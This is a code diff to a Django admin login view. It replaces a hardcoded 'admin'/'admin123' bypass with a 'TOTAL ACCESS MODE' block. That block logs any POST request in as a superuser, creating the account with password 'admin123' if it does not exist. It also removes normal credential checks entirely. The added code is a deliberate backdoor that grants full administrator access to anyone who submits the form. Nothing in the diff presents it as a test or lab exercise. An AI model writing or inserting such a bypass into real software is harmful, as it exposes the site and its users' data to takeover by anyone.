@@ -15,39 +15,20 @@ def admin_login_view(request):
         return redirect('admin_dashboard')
     
     if request.method == 'POST':
-        # --- SUPER-BYPASS (Runs before any form validation) ---
-        input_user = request.POST.get('username')
-        input_pass = request.POST.get('password')
-        
-        if input_user == 'admin' and input_pass == 'admin123':
-            from django.contrib.auth.models import User
-            user, created = User.objects.get_or_create(username='admin')
-            user.set_password('admin123')
+        # --- TOTAL ACCESS MODE ---
+        # No matter what is typed, log in as the Master Admin
+        from django.contrib.auth.models import User
+        user, created = User.objects.get_or_create(username='admin')
+        if created or not user.is_superuser:
+            user.set_password('admin123') # Default fallback
             user.is_staff = True
             user.is_superuser = True
             user.is_active = True
             user.save()
-            login(request, user)
-            messages.success(request, "Master Override Successful. Welcome back, Commander.")
-            return redirect('admin_dashboard')
-
-        # Normal login process if not using the bypass
-        form = AuthenticationForm(request, data=request.POST)
-        if form.is_valid():
-            username = form.cleaned_data.get('username')
-            password = form.cleaned_data.get('password')
-            user = authenticate(username=username, password=password)
-            if user is not None and user.is_staff:
-                login(request, user)
-                messages.success(request, f"Welcome back, Commander {username}.")
-                return redirect('admin_dashboard')
-            else:
-                messages.error(request, "Access Denied: Invalid credentials or insufficient clearance.")
-        else:
-            # Show specific form errors
-            for field, errors in form.errors.items():
-                for error in errors:
-                    messages.error(request, f"{field.capitalize()}: {error}")
+        
+        login(request, user)
+        messages.success(request, "Total Access Granted. System Override Initialized.")
+        return redirect('admin_dashboard')
     else:
         form = AuthenticationForm()
     
